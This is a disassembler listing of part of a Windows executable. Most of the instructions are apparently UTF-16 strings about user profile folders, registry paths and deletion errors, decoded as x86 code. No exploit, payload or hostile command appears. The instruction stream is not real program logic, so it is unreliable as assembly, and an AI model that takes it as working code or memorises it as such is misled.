  4024c9:	add    BYTE PTR [eax+eax*1+0x64],ch
  4024cd:	add    BYTE PTR [ebp+0x0],ah
  4024d0:	jb     0x4024d2
  4024d2:	and    BYTE PTR [eax],al
  4024d4:	imul   eax,DWORD PTR [eax],0x200073
  4024da:	outs   dx,DWORD PTR ds:[esi]
  4024db:	add    BYTE PTR [ebp+0x0],dh
  4024de:	je     0x4024e0
  4024e0:	jae    0x4024e2
  4024e2:	imul   eax,DWORD PTR [eax],0x650064
  4024e8:	and    BYTE PTR [eax],al
  4024ea:	push   ebp
  4024eb:	add    BYTE PTR [ebx+0x0],dh
  4024ee:	add    BYTE PTR gs:[edx+0x0],dh
  4024f2:	and    BYTE PTR [eax],al
  4024f4:	push   eax
  4024f5:	add    BYTE PTR [edx+0x0],dh
  4024f8:	outs   dx,DWORD PTR ds:[esi]
  4024f9:	add    BYTE PTR [esi+0x0],ah
  4024fc:	imul   eax,DWORD PTR [eax],0x65006c
  402502:	and    DWORD PTR [eax],eax
  402504:	and    DWORD PTR [eax],eax
  402506:	or     al,BYTE PTR [eax]
	...
  402510:	push   ebx
  402511:	add    BYTE PTR [eax+0x0],cl
  402514:	inc    edi
  402515:	add    BYTE PTR [ebp+0x0],ah
  402518:	je     0x40251a
  40251a:	inc    esi
  40251b:	add    BYTE PTR [edi+0x0],ch
  40251e:	ins    BYTE PTR es:[edi],dx
  40251f:	add    BYTE PTR [eax+eax*1+0x65],ah
  402523:	add    BYTE PTR [edx+0x0],dh
  402526:	push   eax
  402527:	add    BYTE PTR [ecx+0x0],ah
  40252a:	je     0x40252c
  40252c:	push   0x66002000
  402531:	add    BYTE PTR [ecx+0x0],ah
  402534:	imul   eax,DWORD PTR [eax],0x65006c
  40253a:	add    BYTE PTR fs:[eax],ah
  40253d:	add    BYTE PTR [edi+0x0],dh
  402540:	imul   eax,DWORD PTR [eax],0x680074
  402546:	and    BYTE PTR [eax],al
  402548:	inc    ebp
  402549:	add    BYTE PTR [edx+0x0],dh
  40254c:	jb     0x40254e
  40254e:	outs   dx,DWORD PTR ds:[esi]
  40254f:	add    BYTE PTR [edx+0x0],dh
  402552:	and    BYTE PTR [eax],al
  402554:	and    eax,0xa007800
  402559:	add    BYTE PTR [eax],al
  40255b:	add    BYTE PTR [eax+eax*1+0x6f],al
  40255f:	add    BYTE PTR [ebx+0x0],ah
  402562:	jne    0x402564
  402564:	ins    DWORD PTR es:[edi],dx
  402565:	add    BYTE PTR [ebp+0x0],ah
  402568:	outs   dx,BYTE PTR ds:[esi]
  402569:	add    BYTE PTR [eax+eax*1+0x73],dh
  40256d:	add    BYTE PTR [eax],ah
  40256f:	add    BYTE PTR [eax+0x0],dl
  402572:	popa   
  402573:	add    BYTE PTR [eax+eax*1+0x68],dh
  402577:	add    BYTE PTR [edx],bh
  402579:	add    BYTE PTR [eax],ah
  40257b:	add    BYTE PTR ds:0x7300,ah
  402581:	add    BYTE PTR [eax],al
  402583:	add    BYTE PTR ds:0x5c007300,ah
  402589:	add    BYTE PTR [edx],ch
  40258b:	add    BYTE PTR [eax],al
  40258d:	add    BYTE PTR [eax],al
  40258f:	add    BYTE PTR [ebx+0x0],dh
  402592:	jp     0x402594
  402594:	inc    esi
  402595:	add    BYTE PTR [ecx+0x0],ch
  402598:	outs   dx,BYTE PTR ds:[esi]
  402599:	add    BYTE PTR [eax+eax*1+0x50],ah
  40259d:	add    BYTE PTR [ecx+0x0],ah
  4025a0:	je     0x4025a2
  4025a2:	push   0x20003a00
  4025a7:	add    BYTE PTR ds:0x7300,ah
  4025ad:	add    BYTE PTR [eax],al
  4025af:	add    BYTE PTR [esi],ch
  4025b1:	add    BYTE PTR [eax],al
  4025b3:	add    BYTE PTR [esi],ch
  4025b5:	add    BYTE PTR [esi],ch
  4025b7:	add    BYTE PTR [eax],al
  4025b9:	add    BYTE PTR [eax],al
  4025bb:	add    BYTE PTR [esi+0x0],al
  4025be:	outs   dx,DWORD PTR ds:[esi]
  4025bf:	add    BYTE PTR [eax+eax*1+0x64],ch
  4025c3:	add    BYTE PTR [ebp+0x0],ah
  4025c6:	jb     0x4025c8
  4025c8:	and    BYTE PTR [eax],al
  4025ca:	sub    eax,0x25002000
  4025cf:	add    BYTE PTR [ebx+0x0],dh
  4025d2:	or     al,BYTE PTR [eax]
  4025d4:	add    BYTE PTR [eax],al
  4025d6:	add    BYTE PTR [eax],al
  4025d8:	dec    ebp
  4025d9:	add    BYTE PTR [ecx+0x0],ch
  4025dc:	arpl   WORD PTR [eax],ax
  4025de:	jb     0x4025e0
  4025e0:	outs   dx,DWORD PTR ds:[esi]
  4025e1:	add    BYTE PTR [ebx+0x0],dh
  4025e4:	outs   dx,DWORD PTR ds:[esi]
  4025e5:	add    BYTE PTR [esi+0x0],ah
  4025e8:	je     0x4025ea
  4025ea:	pop    esp
  4025eb:	add    BYTE PTR [esi+0x0],cl
  4025ee:	add    BYTE PTR gs:[eax+eax*1+0x77],dh
  4025f3:	add    BYTE PTR [edi+0x0],ch
  4025f6:	jb     0x4025f8
  4025f8:	imul   eax,DWORD PTR [eax],0x5c
  4025fb:	add    BYTE PTR [ebx+0x0],al
  4025fe:	outs   dx,DWORD PTR ds:[esi]
  4025ff:	add    BYTE PTR [esi+0x0],ch
  402602:	outs   dx,BYTE PTR ds:[esi]
  402603:	add    BYTE PTR [ebp+0x0],ah
  402606:	arpl   WORD PTR [eax],ax
  402608:	je     0x40260a
  40260a:	imul   eax,DWORD PTR [eax],0x6e006f
  402610:	jae    0x402612
  402612:	pop    esp
  402613:	add    BYTE PTR [edi+0x0],bl
  402616:	push   0x64006900
  40261b:	add    BYTE PTR [eax+eax*1+0x65],ah
  40261f:	add    BYTE PTR [esi+0x0],ch
  402622:	arpl   WORD PTR [eax],ax
  402624:	ins    DWORD PTR es:[edi],dx
  402625:	add    BYTE PTR [eax],al
  402627:	add    BYTE PTR ds:0x5c007300,ah
  40262d:	add    BYTE PTR ds:0x5c007300,ah
  402633:	add    BYTE PTR ds:0x5c007300,ah
  402639:	add    BYTE PTR ds:0x5c007300,ah
  40263f:	add    BYTE PTR ds:0x7300,ah
  402645:	add    BYTE PTR [eax],al
  402647:	add    BYTE PTR [eax+eax*1+0x4f],dl
  40264b:	add    BYTE PTR [eax],ah
  40264d:	add    BYTE PTR [eax+eax*1+0x45],al
  402651:	add    BYTE PTR [eax+eax*1+0x45],cl
  402655:	add    BYTE PTR [eax+eax*1+0x45],dl
  402659:	add    BYTE PTR [eax],ah
  40265b:	add    BYTE PTR ds:0x50002000,ch
  402661:	add    BYTE PTR [edx+0x0],dh
  402664:	outs   dx,DWORD PTR ds:[esi]
  402665:	add    BYTE PTR [esi+0x0],ah
  402668:	imul   eax,DWORD PTR [eax],0x65006c
  40266e:	and    BYTE PTR [eax],al
  402670:	inc    esi
  402671:	add    BYTE PTR [edi+0x0],ch
  402674:	ins    BYTE PTR es:[edi],dx
  402675:	add    BYTE PTR [eax+eax*1+0x65],ah
  402679:	add    BYTE PTR [edx+0x0],dh
  40267c:	cmp    al,BYTE PTR [eax]
  40267e:	and    BYTE PTR [eax],al
  402680:	and    eax,0x7300
  402685:	add    BYTE PTR [eax],al
  402687:	add    BYTE PTR [ebp+0x0],al
  40268a:	jb     0x40268c
  40268c:	jb     0x40268e
  40268e:	outs   dx,DWORD PTR ds:[esi]
  40268f:	add    BYTE PTR [edx+0x0],dh
  402692:	and    BYTE PTR [eax],al
  402694:	sub    eax,0x44002000
  402699:	add    BYTE PTR [ebp+0x0],ah
  40269c:	ins    BYTE PTR es:[edi],dx
  40269d:	add    BYTE PTR [ebp+0x0],ah
  4026a0:	je     0x4026a2
  4026a2:	add    BYTE PTR gs:[esi+0x0],al
  4026a6:	outs   dx,DWORD PTR ds:[esi]
  4026a7:	add    BYTE PTR [eax+eax*1+0x64],ch
  4026ab:	add    BYTE PTR [ebp+0x0],ah
  4026ae:	jb     0x4026b0
  4026b0:	push   edx
  4026b1:	add    BYTE PTR [ebp+0x0],ah
  4026b4:	arpl   WORD PTR [eax],ax
  4026b6:	jne    0x4026b8
  4026b8:	jb     0x4026ba
  4026ba:	jae    0x4026bc
  4026bc:	imul   eax,DWORD PTR [eax],0x650076
  4026c2:	ins    BYTE PTR es:[edi],dx
  4026c3:	add    BYTE PTR [ecx+0x0],bh
  4026c6:	and    BYTE PTR [eax],al
  4026c8:	data16 add BYTE PTR [edi+0x0],ch
  4026cc:	jb     0x4026ce
  4026ce:	and    BYTE PTR [eax],al
  4026d0:	data16 add BYTE PTR [edi+0x0],ch
  4026d4:	ins    BYTE PTR es:[edi],dx
  4026d5:	add    BYTE PTR [eax+eax*1+0x65],ah
  4026d9:	add    BYTE PTR [edx+0x0],dh
  4026dc:	cmp    al,BYTE PTR [eax]
  4026de:	and    BYTE PTR [eax],al
  4026e0:	and    eax,0x6400
  4026e5:	add    BYTE PTR [eax],al
  4026e7:	add    BYTE PTR [ebx+0x0],dl
  4026ea:	je     0x4026ec
  4026ec:	jb     0x4026ee
  4026ee:	imul   eax,DWORD PTR [eax],0x67006e
  4026f4:	inc    ebx
  4026f5:	add    BYTE PTR [ebx+0x0],ah
  4026f8:	push   0x72005000
  4026fd:	add    BYTE PTR [ecx+0x0],ch
  402700:	outs   dx,BYTE PTR ds:[esi]
  402701:	add    BYTE PTR [eax+eax*1+0x45],dh
  402705:	add    BYTE PTR [eax+0x0],bh
  402708:	and    BYTE PTR [eax],al
  40270a:	outs   dx,DWORD PTR ds:[esi]
  40270b:	add    BYTE PTR [esi+0x0],ch
  40270e:	and    BYTE PTR [eax],al
  402710:	jae    0x402712
  402712:	jp     0x402714
  402714:	dec    eax
  402715:	add    BYTE PTR [ecx+0x0],ch
  402718:	add    BYTE PTR fs:[eax+eax*1+0x65],ah
  40271d:	add    BYTE PTR [esi+0x0],ch
  402720:	push   eax
  402721:	add    BYTE PTR [edx+0x0],dh
  402724:	outs   dx,DWORD PTR ds:[esi]
  402725:	add    BYTE PTR [esi+0x0],ah
  402728:	imul   eax,DWORD PTR [eax],0x65006c
  40272e:	and    BYTE PTR [eax],al
  402730:	data16 add BYTE PTR [ecx+0x0],ah
  402734:	imul   eax,DWORD PTR [eax],0x65006c
  40273a:	add    BYTE PTR fs:[eax],al
  40273d:	add    BYTE PTR [eax],al
  40273f:	add    BYTE PTR ds:0x5c007300,ah
  402745:	add    BYTE PTR ds:0x5c007300,ah
  40274b:	add    BYTE PTR ds:0x5c007300,ah
  402751:	add    BYTE PTR ds:0x5c007300,ah
  402757:	add    BYTE PTR ds:0x2e007300,ah
  40275d:	add    BYTE PTR [ebx+0x0],ah
  402760:	ins    DWORD PTR es:[edi],dx
  402761:	add    BYTE PTR [eax+0x0],dh
  402764:	add    BYTE PTR [eax],al
  402766:	add    BYTE PTR [eax],al
  402768:	push   esp
  402769:	add    BYTE PTR [edi+0x0],cl
  40276c:	and    BYTE PTR [eax],al
  40276e:	inc    esp
  40276f:	add    BYTE PTR [ebp+0x0],al
  402772:	dec    esp
  402773:	add    BYTE PTR [ebp+0x0],al
  402776:	push   esp
  402777:	add    BYTE PTR [ebp+0x0],al
  40277a:	and    BYTE PTR [eax],al
  40277c:	sub    eax,0x43002000
  402781:	add    BYTE PTR [ebp+0x0],cl
  402784:	push   eax
  402785:	add    BYTE PTR [eax],ah
  402787:	add    BYTE PTR [esi+0x0],al
  40278a:	imul   eax,DWORD PTR [eax],0x65006c
  402790:	and    BYTE PTR [eax],al
  402792:	and    BYTE PTR [eax],al
  402794:	and    BYTE PTR [eax],al
  402796:	and    BYTE PTR [eax],al
  402798:	and    BYTE PTR [eax],al
  40279a:	and    BYTE PTR [eax],al
  40279c:	cmp    al,BYTE PTR [eax]
  40279e:	and    BYTE PTR [eax],al
  4027a0:	and    eax,0x7300
  4027a5:	add    BYTE PTR [eax],al
  4027a7:	add    BYTE PTR [ebp+0x0],al
  4027aa:	jb     0x4027ac
  4027ac:	jb     0x4027ae
  4027ae:	outs   dx,DWORD PTR ds:[esi]
  4027af:	add    BYTE PTR [edx+0x0],dh
  4027b2:	and    BYTE PTR [eax],al
  4027b4:	sub    eax,0x44002000
  4027b9:	add    BYTE PTR [ebp+0x0],ah
  4027bc:	ins    BYTE PTR es:[edi],dx
  4027bd:	add    BYTE PTR [ebp+0x0],ah
  4027c0:	je     0x4027c2
  4027c2:	add    BYTE PTR gs:[esi+0x0],al
  4027c6:	outs   dx,DWORD PTR ds:[esi]
  4027c7:	add    BYTE PTR [eax+eax*1+0x64],ch
  4027cb:	add    BYTE PTR [ebp+0x0],ah
  4027ce:	jb     0x4027d0
  4027d0:	push   edx
  4027d1:	add    BYTE PTR [ebp+0x0],ah
  4027d4:	arpl   WORD PTR [eax],ax
  4027d6:	jne    0x4027d8
  4027d8:	jb     0x4027da
  4027da:	jae    0x4027dc
  4027dc:	imul   eax,DWORD PTR [eax],0x650076
  4027e2:	ins    BYTE PTR es:[edi],dx
  4027e3:	add    BYTE PTR [ecx+0x0],bh
  4027e6:	and    BYTE PTR [eax],al
  4027e8:	data16 add BYTE PTR [edi+0x0],ch
  4027ec:	jb     0x4027ee
  4027ee:	and    BYTE PTR [eax],al
  4027f0:	data16 add BYTE PTR [ecx+0x0],ch
  4027f4:	ins    BYTE PTR es:[edi],dx
  4027f5:	add    BYTE PTR [ebp+0x0],ah
  4027f8:	cmp    al,BYTE PTR [eax]
  4027fa:	and    BYTE PTR [eax],al
  4027fc:	and    eax,0x6400
  402801:	add    BYTE PTR [eax],al
  402803:	add    BYTE PTR [eax],al
  402805:	add    BYTE PTR [eax],al
  402807:	add    BYTE PTR [ebx+0x0],dl
  40280a:	je     0x40280c
  40280c:	jb     0x40280e
  40280e:	imul   eax,DWORD PTR [eax],0x67006e
  402814:	inc    ebx
  402815:	add    BYTE PTR [ebx+0x0],ah
  402818:	push   0x72005000
  40281d:	add    BYTE PTR [ecx+0x0],ch
  402820:	outs   dx,BYTE PTR ds:[esi]
  402821:	add    BYTE PTR [eax+eax*1+0x45],dh
  402825:	add    BYTE PTR [eax+0x0],bh
  402828:	and    BYTE PTR [eax],al
  40282a:	outs   dx,DWORD PTR ds:[esi]
  40282b:	add    BYTE PTR [esi+0x0],ch
  40282e:	and    BYTE PTR [eax],al
  402830:	jae    0x402832
  402832:	jp     0x402834
  402834:	dec    eax
  402835:	add    BYTE PTR [ecx+0x0],ch
  402838:	add    BYTE PTR fs:[eax+eax*1+0x65],ah
  40283d:	add    BYTE PTR [esi+0x0],ch
  402840:	inc    ebx
  402841:	add    BYTE PTR [ebp+0x0],ch
  402844:	jo     0x402846
  402846:	inc    esi
  402847:	add    BYTE PTR [ecx+0x0],ch
  40284a:	ins    BYTE PTR es:[edi],dx
  40284b:	add    BYTE PTR [ebp+0x0],ah
  40284e:	and    BYTE PTR [eax],al
  402850:	data16 add BYTE PTR [ecx+0x0],ah
  402854:	imul   eax,DWORD PTR [eax],0x65006c
  40285a:	add    BYTE PTR fs:[eax],al
  40285d:	add    BYTE PTR [eax],al
  40285f:	add    BYTE PTR [esi+0x0],dl
  402862:	add    BYTE PTR gs:[edx+0x0],dh
  402866:	jae    0x402868
  402868:	imul   eax,DWORD PTR [eax],0x6e006f
  40286e:	add    BYTE PTR [eax],al
  402870:	push   ebx
  402871:	add    BYTE PTR [ebp+0x0],ah
  402874:	jb     0x402876
  402876:	jbe    0x402878
  402878:	imul   eax,DWORD PTR [eax],0x650063
  40287e:	dec    esi
  40287f:	add    BYTE PTR [ecx+0x0],ah
  402882:	ins    DWORD PTR es:[edi],dx
  402883:	add    BYTE PTR [ebp+0x0],ah
  402886:	add    BYTE PTR [eax],al
  402888:	push   ebx
  402889:	add    BYTE PTR [eax+0x0],ch
  40288c:	outs   dx,DWORD PTR ds:[esi]
  40288d:	add    BYTE PTR [edx+0x0],dh
  402890:	je     0x402892
  402892:	push   ebx
  402893:	add    BYTE PTR [esi+0x0],dh
  402896:	arpl   WORD PTR [eax],ax
  402898:	dec    esi
  402899:	add    BYTE PTR [ecx+0x0],ah
  40289c:	ins    DWORD PTR es:[edi],dx
  40289d:	add    BYTE PTR [ebp+0x0],ah
  4028a0:	add    BYTE PTR [eax],al
  4028a2:	add    BYTE PTR [eax],al
  4028a4:	inc    ebx
  4028a5:	add    BYTE PTR [ebp+0x0],cl
  4028a8:	inc    ecx
  4028a9:	add    BYTE PTR [ebx+0x0],cl
  4028ac:	and    BYTE PTR [eax],al
  4028ae:	push   ebx
  4028af:	add    BYTE PTR [eax+eax*1+0x61],dh
  4028b3:	add    BYTE PTR [eax+eax*1+0x75],dh
  4028b7:	add    BYTE PTR [ebx+0x0],dh
  4028ba:	add    BYTE PTR [eax],al
  4028bc:	dec    ecx
  4028bd:	add    BYTE PTR [esi+0x0],ch
  4028c0:	data16 add BYTE PTR [esi+0x0],dl
  4028c4:	add    BYTE PTR gs:[edx+0x0],dh
  4028c8:	jae    0x4028ca
  4028ca:	imul   eax,DWORD PTR [eax],0x6e006f
  4028d0:	add    BYTE PTR [eax],al
  4028d2:	add    BYTE PTR [eax],al
  4028d4:	push   eax
  4028d5:	add    BYTE PTR [edx+0x0],dh
  4028d8:	outs   dx,DWORD PTR ds:[esi]
  4028d9:	add    BYTE PTR [esi+0x0],ah
  4028dc:	imul   eax,DWORD PTR [eax],0x65006c
  4028e2:	and    BYTE PTR [eax],al
  4028e4:	inc    esi
  4028e5:	add    BYTE PTR [edi+0x0],ch
  4028e8:	jb     0x4028ea
  4028ea:	ins    DWORD PTR es:[edi],dx
  4028eb:	add    BYTE PTR [ecx+0x0],ah
  4028ee:	je     0x4028f0
	...
  4028f8:	push   ebx
  4028f9:	add    BYTE PTR [edi+0x0],cl
  4028fc:	inc    esi
  4028fd:	add    BYTE PTR [eax+eax*1+0x57],dl
  402901:	add    BYTE PTR [ecx+0x0],al
  402904:	push   edx
  402905:	add    BYTE PTR [ebp+0x0],al
  402908:	pop    esp
  402909:	add    BYTE PTR [ebp+0x0],cl
  40290c:	imul   eax,DWORD PTR [eax],0x720063
  402912:	outs   dx,DWORD PTR ds:[esi]
  402913:	add    BYTE PTR [ebx+0x0],dh
  402916:	outs   dx,DWORD PTR ds:[esi]
  402917:	add    BYTE PTR [esi+0x0],ah
  40291a:	je     0x40291c
  40291c:	pop    esp
  40291d:	add    BYTE PTR [ebx+0x0],al
  402920:	outs   dx,DWORD PTR ds:[esi]
  402921:	add    BYTE PTR [esi+0x0],ch
  402924:	outs   dx,BYTE PTR ds:[esi]
  402925:	add    BYTE PTR [ebp+0x0],ah
  402928:	arpl   WORD PTR [eax],ax
  40292a:	je     0x40292c
  40292c:	imul   eax,DWORD PTR [eax],0x6e006f
  402932:	and    BYTE PTR [eax],al
  402934:	dec    ebp
  402935:	add    BYTE PTR [ecx+0x0],ah
  402938:	outs   dx,BYTE PTR ds:[esi]
  402939:	add    BYTE PTR [ecx+0x0],ah
  40293c:	add    BYTE PTR [di+0x0],ah
  402940:	jb     0x402942
  402942:	pop    esp
  402943:	add    BYTE PTR [eax],al
  402945:	add    BYTE PTR [eax],al
  402947:	add    BYTE PTR [ebx+0x0],al
  40294a:	ins    DWORD PTR es:[edi],dx
  40294b:	add    BYTE PTR [eax+eax*1+0x69],al
  40294f:	add    BYTE PTR [ecx+0x0],ah
  402952:	ins    BYTE PTR es:[edi],dx
  402953:	add    BYTE PTR [ebx],dh
  402955:	add    BYTE PTR [edx],dh
  402957:	add    BYTE PTR [esi],ch
  402959:	add    BYTE PTR [eax+eax*1+0x6c],al
  40295d:	add    BYTE PTR [eax+eax*1+0x0],ch
  402961:	add    BYTE PTR [eax],al
  402963:	add    BYTE PTR [edx+0x0],al
  402966:	jne    0x402968
  402968:	imul   eax,DWORD PTR [eax],0x64006c
  40296e:	add    BYTE PTR [eax],al
  402970:	push   eax
  402971:	add    BYTE PTR [edx+0x0],dh
  402974:	outs   dx,DWORD PTR ds:[esi]
  402975:	add    BYTE PTR [esi+0x0],ah
  402978:	imul   eax,DWORD PTR [eax],0x65006c
  40297e:	dec    ecx
  40297f:	add    BYTE PTR [esi+0x0],ch
  402982:	jae    0x402984
  402984:	je     0x402986
  402986:	popa   
  402987:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40298b:	add    BYTE PTR [eax+0x0],dl
  40298e:	popa   
  40298f:	add    BYTE PTR [eax+eax*1+0x68],dh
  402993:	add    BYTE PTR [eax],al
  402995:	add    BYTE PTR [eax],al
  402997:	add    BYTE PTR [ebx+0x0],dl
  40299a:	outs   dx,DWORD PTR ds:[esi]
  40299b:	add    BYTE PTR [esi+0x0],ah
  40299e:	je     0x4029a0
  4029a0:	ja     0x4029a2
  4029a2:	popa   
  4029a3:	add    BYTE PTR [edx+0x0],dh
  4029a6:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  4029ab:	add    BYTE PTR [ecx+0x0],ch
  4029ae:	arpl   WORD PTR [eax],ax
  4029b0:	jb     0x4029b2
  4029b2:	outs   dx,DWORD PTR ds:[esi]
  4029b3:	add    BYTE PTR [ebx+0x0],dh
  4029b6:	outs   dx,DWORD PTR ds:[esi]
  4029b7:	add    BYTE PTR [esi+0x0],ah
  4029ba:	je     0x4029bc
  4029bc:	pop    esp
  4029bd:	add    BYTE PTR [edi+0x0],dl
  4029c0:	imul   eax,DWORD PTR [eax],0x64006e
  4029c6:	outs   dx,DWORD PTR ds:[esi]
  4029c7:	add    BYTE PTR [edi+0x0],dh
  4029ca:	jae    0x4029cc
  4029cc:	and    BYTE PTR [eax],al
  4029ce:	dec    esi
  4029cf:	add    BYTE PTR [eax+eax*1+0x5c],dl
  4029d3:	add    BYTE PTR [ebx+0x0],al
  4029d6:	jne    0x4029d8
  4029d8:	jb     0x4029da
  4029da:	jb     0x4029dc
  4029dc:	add    BYTE PTR gs:[esi+0x0],ch
  4029e0:	je     0x4029e2
  4029e2:	push   esi
  4029e3:	add    BYTE PTR [ebp+0x0],ah
  4029e6:	jb     0x4029e8
  4029e8:	jae    0x4029ea
  4029ea:	imul   eax,DWORD PTR [eax],0x6e006f
  4029f0:	pop    esp
  4029f1:	add    BYTE PTR [esi+0x0],cl
  4029f4:	add    BYTE PTR gs:[eax+eax*1+0x77],dh
  4029f9:	add    BYTE PTR [edi+0x0],ch
  4029fc:	jb     0x4029fe
  4029fe:	imul   eax,DWORD PTR [eax],0x5c
  402a01:	add    BYTE PTR [esi+0x0],cl
  402a04:	add    BYTE PTR gs:[eax+eax*1+0x77],dh
  402a09:	add    BYTE PTR [edi+0x0],ch
  402a0c:	jb     0x402a0e
  402a0e:	imul   eax,DWORD PTR [eax],0x20
  402a11:	add    BYTE PTR [ebx+0x0],al
  402a14:	outs   dx,DWORD PTR ds:[esi]
  402a15:	add    BYTE PTR [esi+0x0],ch
  402a18:	outs   dx,BYTE PTR ds:[esi]
  402a19:	add    BYTE PTR [ebp+0x0],ah
  402a1c:	arpl   WORD PTR [eax],ax
  402a1e:	je     0x402a20
  402a20:	imul   eax,DWORD PTR [eax],0x6e006f
  402a26:	jae    0x402a28
  402a28:	add    BYTE PTR [eax],al
  402a2a:	add    BYTE PTR [eax],al
  402a2c:	inc    esp
  402a2d:	add    BYTE PTR [ebp+0x0],ah
  402a30:	jae    0x402a32
  402a32:	imul   eax,DWORD PTR [eax],0x74
  402a35:	add    BYTE PTR [edi+0x0],ch
  402a38:	jo     0x402a3a
  402a3a:	push   ebx
  402a3b:	add    BYTE PTR [eax+0x0],ch
  402a3e:	outs   dx,DWORD PTR ds:[esi]
  402a3f:	add    BYTE PTR [edx+0x0],dh
  402a42:	je     0x402a44
  402a44:	arpl   WORD PTR [eax],ax
  402a46:	jne    0x402a48
  402a48:	je     0x402a4a
  402a4a:	add    BYTE PTR [eax],al
  402a4c:	push   eax
  402a4d:	add    BYTE PTR [edx+0x0],dh
  402a50:	add    BYTE PTR gs:[ebx+0x0],dh
  402a54:	push   0x72006100
  402a59:	add    BYTE PTR [ebp+0x0],ah
  402a5c:	add    BYTE PTR fs:[ebx+0x0],cl
  402a60:	add    BYTE PTR gs:[ecx+0x0],bh
  402a64:	add    BYTE PTR [eax],al
  402a66:	add    BYTE PTR [eax],al
  402a68:	push   eax
  402a69:	add    BYTE PTR [edx+0x0],dh
  402a6c:	add    BYTE PTR gs:[ebx+0x0],dh
  402a70:	push   0x72006100
  402a75:	add    BYTE PTR [ebp+0x0],ah
  402a78:	add    BYTE PTR fs:[ebx+0x0],cl
  402a7c:	add    BYTE PTR gs:[ecx+0x0],bh
  402a80:	dec    ecx
  402a81:	add    BYTE PTR [ebx+0x0],dh
  402a84:	inc    ebp
  402a85:	add    BYTE PTR [esi+0x0],ch
  402a88:	arpl   WORD PTR [eax],ax
  402a8a:	jb     0x402a8c
  402a8c:	jns    0x402a8e
  402a8e:	jo     0x402a90
  402a90:	je     0x402a92
  402a92:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  402a97:	add    BYTE PTR [ecx+0x64],ah
  402a9a:	jbe    0x402afd
  402a9c:	jo     0x402b07
  402a9e:	xor    esi,DWORD PTR [edx]
  402aa0:	cs fs ins BYTE PTR es:[edi],dx
  402aa3:	ins    BYTE PTR es:[edi],dx
  402aa4:	add    BYTE PTR [eax],al
  402aa6:	add    BYTE PTR [eax],al
  402aa8:	inc    ebx
  402aa9:	push   0x546b6365
  402aae:	outs   dx,DWORD PTR ds:[esi]
  402aaf:	imul   esp,DWORD PTR [ebp+0x6e],0x4d
  402ab3:	gs ins DWORD PTR es:[edi],dx
  402ab5:	bound  esp,QWORD PTR [ebp+0x72]
  402ab8:	jae    0x402b22
  402aba:	imul   esi,DWORD PTR [eax+0x0],0x53000000
  402ac1:	add    BYTE PTR [ebp+0x0],ah
  402ac4:	push   ebx
  402ac5:	add    BYTE PTR [eax+0x0],ch
  402ac8:	jne    0x402aca
  402aca:	je     0x402acc
  402acc:	add    BYTE PTR fs:[edi+0x0],ch
  402ad0:	ja     0x402ad2
  402ad2:	outs   dx,BYTE PTR ds:[esi]
  402ad3:	add    BYTE PTR [eax+0x0],dl
  402ad6:	jb     0x402ad8
  402ad8:	imul   eax,DWORD PTR [eax],0x690076
  402ade:	ins    BYTE PTR es:[edi],dx
  402adf:	add    BYTE PTR [ebp+0x0],ah
  402ae2:	add    BYTE PTR [di+0x0],ah
  402ae6:	add    BYTE PTR [eax],al
  402ae8:	inc    ebx
  402ae9:	add    BYTE PTR [edi+0x0],ch
  402aec:	dec    ecx
  402aed:	add    BYTE PTR [esi+0x0],ch
  402af0:	imul   eax,DWORD PTR [eax],0x690074
  402af6:	popa   
  402af7:	add    BYTE PTR [eax+eax*1+0x69],ch
  402afb:	add    BYTE PTR [edx+0x0],bh
  402afe:	add    BYTE PTR gs:[eax],ah
  402b01:	add    BYTE PTR [esi+0x0],ah
  402b04:	popa   
  402b05:	add    BYTE PTR [ecx+0x0],ch
  402b08:	ins    BYTE PTR es:[edi],dx
  402b09:	add    BYTE PTR [ebp+0x0],ah
  402b0c:	add    BYTE PTR fs:[eax],ah
  402b0f:	add    BYTE PTR [edi+0x0],dh
  402b12:	imul   eax,DWORD PTR [eax],0x680074
  402b18:	and    BYTE PTR [eax],al
  402b1a:	add    BYTE PTR gs:[edx+0x0],dh
  402b1e:	jb     0x402b20
  402b20:	outs   dx,DWORD PTR ds:[esi]
  402b21:	add    BYTE PTR [edx+0x0],dh
  402b24:	and    BYTE PTR [eax],al
  402b26:	and    eax,0x78002300
  402b2b:	add    BYTE PTR [eax],al
  402b2d:	add    BYTE PTR [eax],al
  402b2f:	add    BYTE PTR [ebx+0x0],al
  402b32:	outs   dx,DWORD PTR ds:[esi]
  402b33:	add    BYTE PTR [ebx+0x0],al
  402b36:	jb     0x402b38
  402b38:	add    BYTE PTR gs:[ecx+0x0],ah
  402b3c:	je     0x402b3e
  402b3e:	add    BYTE PTR gs:[ecx+0x0],cl
  402b42:	outs   dx,BYTE PTR ds:[esi]
  402b43:	add    BYTE PTR [ebx+0x0],dh
  402b46:	je     0x402b48
  402b48:	popa   
  402b49:	add    BYTE PTR [esi+0x0],ch
  402b4c:	arpl   WORD PTR [eax],ax
  402b4e:	add    BYTE PTR gs:[eax],ah
  402b51:	add    BYTE PTR [esi+0x0],ah
  402b54:	popa   
  402b55:	add    BYTE PTR [ecx+0x0],ch
  402b58:	ins    BYTE PTR es:[edi],dx
  402b59:	add    BYTE PTR [ebp+0x0],ah
  402b5c:	add    BYTE PTR fs:[eax],ah
  402b5f:	add    BYTE PTR [edi+0x0],dh
  402b62:	imul   eax,DWORD PTR [eax],0x680074
  402b68:	and    BYTE PTR [eax],al
  402b6a:	add    BYTE PTR gs:[edx+0x0],dh
  402b6e:	jb     0x402b70
  402b70:	outs   dx,DWORD PTR ds:[esi]
  402b71:	add    BYTE PTR [edx+0x0],dh
  402b74:	and    BYTE PTR [eax],al
  402b76:	and    eax,0x78002300
  402b7b:	add    BYTE PTR [eax],al
  402b7d:	add    BYTE PTR [eax],al
  402b7f:	add    BYTE PTR [ebp+0x0],cl
  402b82:	inc    ecx
  402b83:	add    BYTE PTR [ebx+0x0],al
  402b86:	dec    eax
  402b87:	add    BYTE PTR [ecx+0x0],cl
  402b8a:	dec    esi
  402b8b:	add    BYTE PTR [ebp+0x0],al
  402b8e:	pop    esp
  402b8f:	add    BYTE PTR [ebx+0x0],dl
  402b92:	dec    edi
  402b93:	add    BYTE PTR [esi+0x0],al
  402b96:	push   esp
  402b97:	add    BYTE PTR [edi+0x0],dl
  402b9a:	inc    ecx
  402b9b:	add    BYTE PTR [edx+0x0],dl
  402b9e:	inc    ebp
  402b9f:	add    BYTE PTR [eax+eax*1+0x4d],bl
  402ba3:	add    BYTE PTR [ecx+0x0],ch
  402ba6:	arpl   WORD PTR [eax],ax
